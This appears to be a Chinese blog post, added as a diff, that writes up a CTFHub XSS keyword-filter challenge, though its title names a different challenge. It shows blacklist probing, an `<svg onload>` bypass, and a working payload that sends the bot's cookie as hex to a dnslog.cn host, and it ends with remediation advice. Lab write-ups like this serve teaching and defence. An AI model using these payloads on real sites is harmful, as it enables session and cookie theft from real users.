@@ -1,0 +1,129 @@
+
+---
+layout: post
+title: "CTFHub Writeup-DOM跳转"
+date: 2026-10-26
+categories: CTF
+tags: [CTFHub, Web, DOM跳转]
+---
+
+# CTFHub Writeup - DOM跳转
+
+## 题目类型
+
+WEB
+
+## 0x01 题目信息
+| 项目 | 内容 |
+| --- | --- |
+| 题目名称 | CTFHub 技能学习 - XSS 关键词过滤 |
+| 靶场地址 | `http://challenge-54f0c9fe42ba3037.sandbox.ctfhub.com:10800` |
+| 注入位置 | GET 参数 `name` |
+| 过滤规则 | 黑名单删除关键词，且区分大小写 |
+| 回显位置 | `<h1>Hello, <%-name%></h1>`，未转义 |
+| 获取方式 | `<svg onload=...>` 偷 Bot 的 `flag` Cookie |
+| Flag | `ctfhub{1498a36829ae364f0776c5e4}` |
+## 0x02 漏洞原理
+这题还是反射型 XSS，但服务端加了一层**关键词黑名单**，会把自己认识的危险词从输入里删掉。
+先测几个典型 payload，看它到底删了什么：
+| 输入的 payload | 页面回显 | 结论 |
+| --- | --- | --- |
+| `<script>alert(1)</script>` | `<>alert(1)</>` | `script` 被删 |
+| `<img src=x onerror=alert(1)>` | `< src=x =alert(1)>` | `img`、`onerror` 被删 |
+| `<ScRiPt>alert(1)</ScRiPt>` | `<ScRiPt>alert(1)</ScRiPt>` | 大小写敏感，没被删 |
+| `<scr<script>ipt>alert(1)</scr<script>ipt>` | `<scr<>ipt>alert(1)</scr<>ipt>` | 嵌套写法无效 |
+| `<svg onload=alert(1)>` | `<svg onload=alert(1)>` | 完全没被过滤 |
+可以看出两个问题：
+1. **黑名单不完整**：只盯着 `script`、`img`、`onerror` 这些常见词，`svg`、`onload` 根本不在名单里；
+2. **区分大小写**：`<ScRiPt>` 能原样通过，说明匹配用的是小写字符串。
+这类「删关键词」的过滤非常好绕：换一个同样能执行 JS 的标签、换一个不在名单里的事件属性，就能过。本题最省事的就是 `<svg onload=...>`。
+## 0x03 解题过程
+**3.1 找注入点**
+访问：
+```
+http://challenge-54f0c9fe42ba3037.sandbox.ctfhub.com:10800/?name=CTFHub
+```
+回显 `Hello, CTFHub`。输入 `<script>alert(1)</script>`：
+```
+回显：<h1>Hello, <>alert(1)</>
+```
+`script` 被删掉了，但尖括号还在，说明页面没有做 HTML 转义，只是做了关键词替换。
+**3.2 摸清过滤规则**
+按 0x02 的表格逐个测试，确认：
+- `script`、`img`、`onerror` 会被删除；
+- 匹配区分大小写，`<ScRiPt>` 能过；
+- 嵌套 `<scr<script>ipt>` 不行，因为过滤会把所有出现的 `script` 都删掉，结果变成 `<scr<>ipt>`，标签根本闭合不了；
+- `<svg onload=...>` 完全不在黑名单里。
+**3.3 选择绕过标签**
+`<svg onload=alert(1)>` 是标准事件，浏览器解析 SVG 时会触发 `onload`，而且 `svg`、`onload` 都没被过滤，直接可用。
+**3.4 构造外带 payload**
+目标还是 Bot 的 `flag` Cookie，用 DNSLog 外带。和前面一样，把 Cookie 转十六进制、拆成两个 label：
+```html
+<svg onload="h=document.cookie.split('').map(c=>('0'+c.charCodeAt(0).toString(16)).slice(-2)).join('');i=new Image();i.src='http://'+h.slice(0,50)+'.'+h.slice(50)+'.q8clvj.dnslog.cn/x'">
+```
+检查一下 payload 里有没有踩到黑名单：
+- 没有 `script`、`img`、`onerror`；
+- `Image` 里虽然含 `imag`，但不含 `img` 这三个连续字母，不会被误删；
+- `document.cookie`、`split`、`map`、`charCodeAt` 都不在名单里。
+**3.5 提交给 Bot**
+payload 要先做 URL 编码，再拼到 `name=` 后面：
+```
+curl -X POST --data-urlencode "url=http://challenge-...:10800/?name=<编码后的payload>" \
+  http://challenge-...:10800/submit
+```
+返回：
+```json
+{"code": 0, "msg": "Successfully"}
+```
+Bot 以管理员身份访问这个 URL，SVG 加载时 `onload` 执行，把 Cookie 发出去。
+**3.6 接收并解码**
+几秒后查询 DNSLog，拿到记录：
+```
+666c61673d6374666875627b31343938613336383239616533.36346630373736633565347d.q8clvj.dnslog.cn
+```
+把两段十六进制拼起来解码：
+```
+flag=ctfhub{1498a36829ae364f0776c5e4}
+```
+得到 Flag：
+```
+ctfhub{1498a36829ae364f0776c5e4}
+```
+**3.7 验证**
+- 十六进制解码后是完整的 `flag=ctfhub{...}`，没有截断；
+- 同一 payload 触发了两次记录，内容一致；
+- flag 长度为 32，符合 `ctfhub{` + 24 位十六进制 + `}` 的格式。
+## 0x04 完整流程
+| 步骤 | 操作 | 结果 |
+| --- | --- | --- |
+| 找注入点 | `?name=<script>alert(1)</script>` | `script` 被删，尖括号保留 |
+| 摸规则 | 逐个测试标签和事件 | `script`、`img`、`onerror` 被过滤 |
+| 绕过 | `<svg onload=alert(1)>` | 原样通过 |
+| 构造外带 | `<svg onload="...document.cookie...">` | 可执行、无黑名单词 |
+| 提交 Bot | `POST /submit` 表单 `url=...` | `code:0 Successfully` |
+| 接收 | DNSLog 子域名记录 | 拿到十六进制串 |
+| 解码 | 十六进制转 ASCII | `flag=ctfhub{1498a36829ae364f0776c5e4}` |
+整条链路可以概括为：**摸清黑名单 → 换一个不在名单里的标签（svg/onload）→ 构造外带脚本 → 提交 Bot → DNSLog 接收 → 解码。**
+## 0x05 踩坑记录
+1. **黑名单是区分大小写的**：`<ScRiPt>` 能原样通过，说明匹配逻辑就是简单的小写字符串替换；但别指望所有过滤都这样，实战里要逐个试。
+2. **嵌套 `<scr<script>ipt>` 对「删除型」过滤无效**：过滤会把所有 `script` 都删掉，剩下 `<scr<>ipt>`，标签闭合不了，反而不如直接换标签。
+3. **`img` 被删了还有 `svg`**：不要死磕一个标签，`<svg onload>`、`<details ontoggle>` 都是常见替代。
+4. **`Image` 不会命中 `img`**：`new Image()` 里的字母是 i-m-a-g-e，不含连续的 `img`，所以不会被误删；但改代码前最好自己核对一遍。
+5. **payload 要先 URL 编码**：直接把 `<svg ...>` 拼进 URL，Bot 侧可能处理不好，先 `EscapeDataString` 再拼。
+6. **DNS 不区分大小写**：base64 会被归一成乱码，外带统一用十六进制。
+7. **DNS label 最长 63 字符**：Cookie 转 hex 后会超长，必须拆成两段。
+8. **提交接口有 5 秒限速**：连续提交会返回 `Wait a while (5s)`，等一会儿再发。
+## 0x06 修复建议
+1. **输出编码**：把 `<%- name %>` 改成 `<%= name %>`，对 `<`、`>`、`"`、`'` 做 HTML 实体编码，这是根本。
+2. **不要用关键词黑名单**：黑名单永远列不全，换标签、换事件、换大小写就能绕；要用白名单。
+3. **输入白名单**：`name` 只允许字母、数字、中文等常规字符，直接拒绝 `<`、`>`。
+4. **加 CSP**：设置 `Content-Security-Policy`，禁止内联脚本和外部脚本加载，即使注入成功也难以执行。
+5. **Cookie 加 HttpOnly**：给 `flag` 这类敏感 Cookie 设置 `HttpOnly`，JS 读不到 `document.cookie`。
+6. **Bot 侧隔离**：管理员的浏览器不要访问不可信 URL，或至少在无敏感 Cookie 的独立会话里访问。
+## 0x07 总结
+关键词过滤是 XSS 里最典型的「黑名单绕过」：
+- 过滤 `script`，就用 `svg`、`img`、`details`；
+- 过滤 `onerror`，就用 `onload`、`ontoggle`；
+- 过滤区分大小写，就换大小写或者换标签。
+只要黑名单没覆盖所有可执行 HTML 的写法，就一定能绕。本题用 `<svg onload=...>` 一步到位，后面就是熟悉的 Cookie 外带：十六进制编码、拆 DNS label、DNSLog 接收。
+防御上，输出编码是根本，CSP 和 HttpOnly 是兜底；靠删几个关键词来防 XSS，和用胶带补墙差不多。
